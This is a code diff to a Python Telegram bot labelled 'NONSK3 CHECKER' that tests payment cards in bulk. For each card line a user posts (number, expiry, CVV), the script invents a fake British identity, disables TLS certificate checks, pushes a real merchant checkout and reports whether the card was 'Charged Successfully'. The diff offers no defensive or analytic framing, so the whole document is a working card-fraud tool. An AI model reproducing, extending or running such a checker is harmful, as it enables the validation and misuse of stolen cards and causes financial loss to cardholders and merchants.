@@ -1,6 +1,17 @@
 import requests
 import time
 import json
+import urllib3
+import re
+
+# Disable InsecureRequestWarning
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def get_str(string, start, end):
+    try:
+        return re.search(f'{start}(.*?){end}', string).group(1)
+    except AttributeError:
+        return None
 
 def get_random_user_info():
     response = requests.get("https://randomuser.me/api?nat=gb", headers={
@@ -14,13 +25,14 @@ def get_random_user_info():
     email = f"{first_name.lower()}{last_name.lower()}@gmail.com"
     return first_name, last_name, email
 
-def check_nonsk3(card_data):
-    card_data = card_data.strip()
-    card_number, exp_month, exp_year, cvc = card_data.split("|")
+def check_nonsk3(cc_data):
+    cc_data = cc_data.strip()
+    card_number, exp_month, exp_year, cvc = cc_data.split("|")
 
     first_name, last_name, email = get_random_user_info()
 
     session = requests.Session()
+    session.verify = False
 
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
@@ -119,7 +131,7 @@ def check_nonsk3(card_data):
     }
     confirm_order_response = session.post(checkout_confirm_url, headers=headers, data=checkout_confirm_data)
 
-    # Step 6: Parse response
+    # Step 5: Parse response
     status = get_str(confirm_order_response.text, '"result":"', '"')
     if status == "success":
         return "Charged Successfully 💳✅"
@@ -136,31 +148,31 @@ def check_nonsk3(card_data):
 
 def handle_nonsk3_command(bot, message):
     chat_id = message.chat.id
-    account_data = message.text.split()[1:]  # Get the account data from the command
-    if account_data:
-        total_accounts = len(account_data)
+    cc_data = message.text.split()[1:]  # Get the cc data from the command
+    if cc_data:
+        total_cards = len(cc_data)
         start_time = time.time()
         results = []
         initial_message = "↯ NONSK3 CHECKER\n\n"
-        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_accounts, start_time, message.from_user.username))
+        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_cards, start_time, message.from_user.username))
 
-        for account in account_data:
-            result = check_nonsk3(account)
-            results.append(f"Card: {account}\nResponse => {result}")
+        for card in cc_data:
+            result = check_nonsk3(card)
+            results.append(f"Card: {card}\nResponse => {result}")
             bot.edit_message_text(
                 chat_id=chat_id,
                 message_id=msg.message_id,
-                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_accounts, start_time, message.from_user.username)
+                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_cards, start_time, message.from_user.username)
             )
 
     else:
-        bot.send_message(chat_id, "Please provide account details in the format: /nsk3 card_number|exp_month|exp_year|cvv")
+        bot.send_message(chat_id, "Please provide card details in the format: /nonsk3 card_number|exp_month|exp_year|cvv")
 
-def get_footer_info(total_accounts, start_time, username):
+def get_footer_info(total_cards, start_time, username):
     elapsed_time = time.time() - start_time
     footer = (
         f"－－－－－－－－－－－－－－－－\n"
-        f"🔹 Total Cards Checked - {total_accounts}\n"
+        f"🔹 Total Cards Checked - {total_cards}\n"
         f"⏱️ Time Taken - {elapsed_time:.2f} seconds\n"
         f"▫️ Checked by: {username}\n"
         f"⚡️ Bot by - AFTAB [BOSS]\n"
